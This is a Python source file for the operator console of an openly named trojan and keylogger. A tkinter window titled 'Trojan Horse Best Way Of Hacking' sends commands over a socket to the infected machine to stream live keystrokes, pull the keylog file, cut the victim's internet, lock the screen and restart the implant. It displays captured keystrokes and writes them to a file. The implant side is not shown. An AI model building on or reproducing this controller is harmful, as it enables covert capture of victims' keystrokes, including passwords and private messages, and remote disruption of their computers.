    #############################################################################
# Client - that connect to the multi-threading server
############################################################################
import threading
import socket
import tkinter as tk
from PIL import ImageTk, Image
flag=False #This global boolean is used to know if the client want to get more info about the server logger
client_wants=""
count2=0
txt1="The Key Logger WIll be Here   :   "
from tkinter import *
class graficGUI(threading.Thread):
    global txt1
    def __init__(self):
        super(graficGUI, self).__init__()
        self.root = Tk()
        self.root.title('Trojan Horse Best Way Of Hacking')
        self.root.geometry('500x500')
        self.button_Keylogg = Button(self.root, text='Send Live KeyLOGGER', command=self.start1)
        self.button_file = Button(self.root, text='Send File Of Keylog', command=self.start_send_file)
        self.Shutdown_Inet= Button(self.root, text='Shut internet', command=self.start_internetShutdown)
        self.Screen_lock = Button(self.root, text='Screen Lock', command=self.start_lock)
        self.Restart_Server = Button(self.root, text='Restart Server', command=self.start_restart1)
        self.button_file.pack()
        self.button_Keylogg.pack()
        self.Shutdown_Inet.pack()
        self.Screen_lock.pack()
        self.Restart_Server.pack()
        self.changelbl = StringVar()
        self.changelbl.set(txt1)
        self.txtArea = Label(self.root,textvariable=self.changelbl)
        self.on = False # Switch to signal running the function that runs the send file.
        self.texttoequel=""
        #self.button_stop = Button(self.root, text='Stop',command=self.stop1)
        self.flag=False
        self.inet=False
        self.lock=False
        self.restart=False
        # placements in the window
        self.txtArea.pack()
        self.root.mainloop()
    def start_restart1(self):
        print("Mewo here")
        self.restart=True
        self.Restart_Server1()
    def Restart_Server1(self):
        global client_wants
        if self.restart==True:
            print("hav hav here")
            client_wants="RESTART"
            self.restart=False
    def start_lock(self):
        self.lock=True
        self.lock_the_screen()
    def lock_the_screen(self):
        global client_wants
        if self.lock==True:
            client_wants="Lock"
            self.lock=False
    def start_internetShutdown(self):
        self.inet=True
        self.Inet_Shutdown()
    def Inet_Shutdown(self):
        global client_wants
        if self.inet==True:
            #global count2
            #count2 = count2 + 1
            client_wants="Internet"
            self.inet=False
    def start1(self):
        """ Starting the getting info """
        self.on = True
        self.start_and_go()
    def start_send_file(self):
        self.flag=True
        self.what_the_client_wants()
    def what_the_client_wants(self):
        if self.flag==True:
            global count2
            count2 = count2 + 1
            global client_wants
            print("Key has Pressed")
            client_wants = "Sendfile"
            # print(client_wants)
    def stop1(self):
        """ Use the switch 'on' to stop running of the stopwatch """
        self.on = False # Causes start_and_go to stop calling itself.
    def start_and_go(self):
        if self.on:
            current_txt = txt1
            self.changelbl.set(current_txt)
            if self.on: # As long as on is True, run the thing every 1000 ms
                self.root.after(1,self.start_and_go)
class Client(threading.Thread):
    def __init__(self, server_ip,  server_port):
        super(Client, self).__init__()
        self.ip = server_ip
        self.port = server_port
    def run(self):
        try:
            print('connecting to ip %s port %s' % (ip, port))
            # Create a TCP/IP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            print('connected to server')
            # send receive example
            msg = sock.recv(1024)
            print('received message: %s' % msg.decode())
            sock.sendall('Hello this is client, send me a job'.encode())
            while True:
                self.handleServerResponse(sock)
        except socket.error as e:
            print(e)
    def handleServerResponse(self, serverSocket):
        global txt1
        global count2
        countsends=0
        count1=0
        strToFile=""
        global flag#writing global means that you want to relate to the var in the top
        global client_wants
        while True:
            x=" "
            #print('Arrived to While loop')
            data_from_server1 = serverSocket.recv(1024)
            data_from_server1=data_from_server1.decode()
            if data_from_server1!= " "and client_wants.upper()!="SENDFILE" and len(data_from_server1)<20:
                #print("You got information :        THIS  is :  "+data_from_server1)
                if "connected" in data_from_server1:
                    print("in")
                else:
                    if(len(data_from_server1)<20):
                        txt1+=data_from_server1
                        print(data_from_server1)
            if data_from_server1.upper()=='DONE':
                print("Written to File : " + "\n" + strToFile)
                file=open("KeyloggerConfig2.txt",'w')
                file.write(strToFile)
                file.close()
                print("Written to File : "+"\n"+strToFile)
                strToFile=""
                client_wants=" "
                countsends=countsends+1
            #print()
            client_wants=client_wants.upper()
            if count2>0 and client_wants!= " ":
                print(client_wants)
                count2=0
            if client_wants!="SENDFILE":
                x = x.encode()
                serverSocket.send(x)
            else:
                if count1==countsends:
                    serverSocket.send("Sendfile".encode())
                    count1=count1+1
                strToFile=strToFile+data_from_server1
            if client_wants=="INTERNET":
                print("ARIVVED TO INTERNET")
                serverSocket.send("internet".encode())
                client_wants=" "
            if client_wants == "LOCK":
                print("Locking The Screen")
                serverSocket.send("lock".encode())
                client_wants = " "
            if client_wants=="RESTART":
                print("RESTARTING SERVER")
                serverSocket.send("restart".encode())
                client_wants= " "
                #print("data from server is "+data_from_server1)
            if data_from_server1 == 'finish':
                return 'finish'

if __name__ == '__main__':
    ip = '127.0.0.1'
    port = 7777
    thread1 = Client(ip, port)
    thread1.start()
    thread2=graficGUI()
    thread2.start()

